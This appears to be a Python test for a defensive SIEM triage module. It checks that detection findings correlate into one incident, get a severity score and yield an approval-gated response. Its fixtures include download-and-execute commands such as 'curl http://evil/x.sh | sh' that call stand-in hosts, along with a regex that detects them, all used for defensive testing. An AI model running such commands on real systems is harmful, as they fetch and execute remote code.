"""TRIAGE1 — blue-team triage / SIEM over the signed Weft: correlate DET1 findings
into incidents, score severity, and propose a response.

Proves: several related findings correlate into ONE incident citing them with a
computed severity + a proposed response; a lone benign finding does NOT escalate;
a tighter time window stops correlation; all on the Weft.

Runs on its OWN fresh Kernel — it forges detections and emits findings; smoke
discovers checks by lexical filename order. Contract: run(k, line). Fail loud.
"""
import os
import tempfile

from decima import detection, triage, model
from decima.kernel import Kernel
from decima.hashing import content_id


def run(_k, line):
    line("\n== TRIAGE / SIEM (correlate findings → incidents · severity · response) ==")
    k = Kernel(os.path.join(tempfile.mkdtemp(), "weft.db"), fresh=True)   # isolated

    # A promoted high-severity detection (pipe-a-download-into-a-shell) ...
    tp = ["curl http://evil/x.sh | sh"]
    fp = ["curl http://example.com -o f.txt"]
    hi = detection.forge_detection(k, "pipe-to-shell",
                                   r"(curl|wget)\s+\S+\s*\|\s*sh", "high", tp, fp, field="text")
    assert hi.promoted, hi.gate
    # ... and a low-severity banner detection (benign, lone).
    lo = detection.forge_detection(k, "info-banner", r"server: nginx", "low",
                                   tp=["server: nginx/1.2"], fp=["the loom weaves"], field="text")
    assert lo.promoted, lo.gate

    # three hosts hit by the same malicious pattern + a benign banner + noise
    obs = {
        "host-a": "curl http://evil/x.sh | sh",
        "host-b": "wget http://bad/y.sh | sh",
        "host-c": "curl http://evil/z.sh | sh",
        "host-d": "server: nginx/1.2",          # lone low finding
        "host-e": "the loom weaves on",         # no finding
    }
    for tag, text in obs.items():
        model.assert_content(k.weft, k.root.id, content_id({"obs": tag}), "observation", {"text": text})

    f_hi = detection.detect(k, hi.det_id, "observation")
    f_lo = detection.detect(k, lo.det_id, "observation")
    assert len(f_hi) == 3 and len(f_lo) == 1, (len(f_hi), len(f_lo))
    line(f"  emitted {len(f_hi)} high findings (pipe-to-shell across 3 hosts) + "
         f"{len(f_lo)} lone low finding (banner)")

    # ---- a tight time window stops correlation (no escalation) -------------
    assert triage.correlate(k, window=1) == [], "window=1 should not cluster spaced findings"
    line("  window=1: findings too far apart to cluster → 0 incidents ✓")

    # ---- correlate (unbounded window): the 3 high findings → ONE incident --
    inc_ids = triage.correlate(k)
    assert len(inc_ids) == 1, [k.weave().get(i).content for i in inc_ids]
    inc = k.weave().get(inc_ids[0])
    # cites exactly the 3 high findings (provenance via `includes` edges)
    cited = set(triage.includes(k.weave(), inc.id))
    assert cited == set(f_hi) and inc.content["finding_count"] == 3, inc.content
    # severity: 3 × high → volume-bumped to critical
    assert inc.content["severity"] == "critical" and inc.content["score"] == 4, inc.content
    line(f"  correlated → incident {inc.id[:8]} citing {inc.content['finding_count']} findings "
         f"across {len(inc.content['sources'])} sources; severity={inc.content['severity']} "
         f"(3×high + volume bump) ✓")

    # ---- the lone low finding did NOT escalate -----------------------------
    assert all(set(triage.includes(k.weave(), i.id)).isdisjoint(f_lo)
               for i in triage.incidents(k.weave())), "a lone low finding must not escalate"
    line("  lone low banner finding did NOT escalate (count 1, below floor) ✓")

    # ---- the incident proposes a (Morta-gated) response --------------------
    resp = triage.response_of(k.weave(), inc.id)
    assert resp is not None and resp.content["kind"] == "action_proposal"
    assert resp.content["requires_approval"] is True
    line(f"  proposed response: {resp.content['kind']} — {resp.content['action']!r} "
         f"(Morta-gated: requires_approval={resp.content['requires_approval']}) ✓")

    # ---- everything is on the Weft -----------------------------------------
    assert k.weave().get(inc.id) and resp and len(triage.incidents(k.weave())) == 1
    line("  → incidents + responses are signed Cells on the Weft (a tamper-evident SIEM) ✓")
